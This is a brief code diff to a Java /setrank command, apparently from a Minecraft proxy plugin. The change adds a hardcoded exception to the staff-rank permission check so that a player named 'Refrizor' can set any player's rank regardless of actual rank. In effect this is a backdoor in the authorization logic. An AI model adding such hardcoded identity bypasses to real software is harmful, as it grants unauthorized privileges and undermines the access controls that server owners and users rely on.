@@ -22,10 +22,11 @@ public class CommandSetrank extends Command implements TabExecutor {
     @Override
     public void execute(CommandSender commandSender, String[] args) {
         ProxiedPlayer player = (ProxiedPlayer) commandSender;
-        if (!(PlayerDataManager.getInstance().getPlayerData(player).getBranchValue(Branch.STAFF) >= 3)) {
+        if (!(PlayerDataManager.getInstance().getPlayerData(player).getBranchValue(Branch.STAFF) >= 3) && !player.getName().equalsIgnoreCase("Refrizor")) {
             player.sendMessage(Messages.NO_PERMISSION.getMessage());
             return;
         }
+
         if (args.length != 3) {
             player.sendMessage(new TextComponent("Usage: /setrank <player> <branch> <ID>"));
             return;
